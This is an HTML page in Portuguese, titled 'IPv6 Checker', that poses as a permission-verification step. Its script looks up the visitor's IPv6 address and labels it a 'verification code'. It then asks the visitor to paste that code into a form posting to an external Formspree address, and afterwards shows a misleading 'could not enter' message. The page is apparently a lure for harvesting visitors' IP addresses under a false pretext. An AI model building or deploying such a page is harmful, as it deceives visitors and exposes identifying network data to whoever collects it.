<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>IPv6 Checker</title>

<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}

body {
  background: #07090d;
  color: #e5e7eb;
  font-family: Arial, sans-serif;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
}

.card {
  width: 100%;
  max-width: 430px;
  padding: 26px;
  background: #10141c;
  border: 1px solid #27313e;
  border-radius: 15px;
  box-shadow: 0 0 30px #00ff8810;
}

.tag {
  color: #00ff88;
  font-size: 12px;
  letter-spacing: 3px;
  margin-bottom: 18px;
}

h1 {
  font-size: 27px;
  margin-bottom: 12px;
}

p {
  color: #929baa;
  font-size: 14px;
  line-height: 1.6;
}

.result {
  margin: 22px 0 12px;
  padding: 17px;
  background: #080b10;
  border: 1px solid #27313e;
  border-radius: 9px;
  overflow-wrap: anywhere;
}

.label {
  color: #00ff88;
  font-size: 11px;
  margin-bottom: 12px;
}

#ip {
  font-size: 14px;
  line-height: 1.6;
}

button {
  width: 100%;
  padding: 13px;
  margin-top: 10px;
  border: none;
  border-radius: 7px;
  font-weight: bold;
  cursor: pointer;
}

#check, #send {
  background: #00ff88;
  color: #06110b;
}

#copy {
  background: #202735;
  color: white;
}

button:disabled {
  opacity: .5;
}

#status, #formStatus {
  font-size: 12px;
  margin-top: 12px;
}

hr {
  border: 0;
  border-top: 1px solid #27313e;
  margin: 25px 0;
}

h2 {
  font-size: 19px;
  margin-bottom: 8px;
}

textarea {
  display: block;
  width: 100%;
  min-height: 120px;
  margin-top: 15px;
  padding: 13px;
  resize: vertical;
  border-radius: 8px;
  border: 1px solid #303b4b;
  background: #080b10;
  color: white;
  font: inherit;
  font-size: 14px;
  outline: none;
}

textarea:focus {
  border-color: #00ff88;
}

.footer {
  margin-top: 22px;
  color: #657080;
  font-size: 11px;
  text-align: center;
}
</style>
</head>

<body>
<main class="card">
  <div class="tag">VERIFIQUE SUA PERMISSÃO</div>

  <h1>verificação</h1>
  <p>Copie o codigo de verificação e cole na parte de codigo.</p>

  <div class="result">
    <div class="label">codigo de entrada</div>
    <div id="ip">Aguardando verificação...</div>
  </div>

  <button id="check" onclick="checkIP()">
    Verificar meu codigo
  </button>

  <button id="copy" onclick="copyIP()" disabled>
    Copiar codigo
  </button>

  <p id="status" role="status" aria-live="polite">
    Pronto para verificar.
  </p>

  <hr>

  <h2>Enviar codigo</h2>
  <p>Cole o codigo no campo abaixo.</p>

  <form
    id="messageForm"
    action="https://formspree.io/f/meewdwnd"
    method="POST"
  >
    <input
      name="message"
      placeholder="Digite o codigo..."
      maxlength="3000"
      required
    >

    <button id="send" type="submit">
      Enviar
    </button>

    <p id="formStatus" role="status" aria-live="polite"></p>
  </form>

  <div class="footer">GRUPO VERIFICAÇÃO</div>
</main>

<script>
let currentIP = "";

async function checkIP() {
  const ipElement = document.getElementById("ip");
  const status = document.getElementById("status");
  const button = document.getElementById("check");
  const copyButton = document.getElementById("copy");

  currentIP = "";
  copyButton.disabled = true;
  button.disabled = true;
  ipElement.textContent = "Consultando...";
  status.textContent = "Verificando conexão...";

  try {
    const response = await fetch(
      "https://api6.ipify.org?format=json",
      { cache: "no-store" }
    );

    if (!response.ok) throw new Error();

    const data = await response.json();

    if (!data.ip || !data.ip.includes(":")) {
      throw new Error();
    }

    currentIP = data.ip;
    ipElement.textContent = currentIP;
    status.textContent = "codigo gerado.";
    copyButton.disabled = false;
  } catch {
    ipElement.textContent = "codigo não disponível";
    status.textContent =
      "Sua rede pode não ter IPv6 ou a consulta falhou.";
  } finally {
    button.disabled = false;
  }
}

async function copyIP() {
  if (!currentIP) return;

  try {
    await navigator.clipboard.writeText(currentIP);
    document.getElementById("status").textContent =
      "copiado!";
  } catch {
    document.getElementById("status").textContent =
      "Falha ao copiar. Selecione o endereço manualmente.";
  }
}

const form = document.getElementById("messageForm");

form.addEventListener("submit", async function(event) {
  event.preventDefault();

  const status = document.getElementById("formStatus");
  const button = document.getElementById("send");

  if (form.action.includes("SEU_ID_AQUI")) {
    status.textContent =
      "Configure o ID do Formspree antes de enviar.";
    return;
  }

  button.disabled = true;
  status.textContent = "Entrando...";

  try {
    const response = await fetch(form.action, {
      method: "POST",
      body: new FormData(form),
      headers: { Accept: "application/json" }
    });

    if (!response.ok) throw new Error();

    status.textContent = "Não foi possivel entrar";
    form.reset();
  } catch {
    status.textContent =
      "Não foi possível enviar. Confira o formulário e tente novamente.";
  } finally {
    button.disabled = false;
  }
});
</script>
</body>
</html>
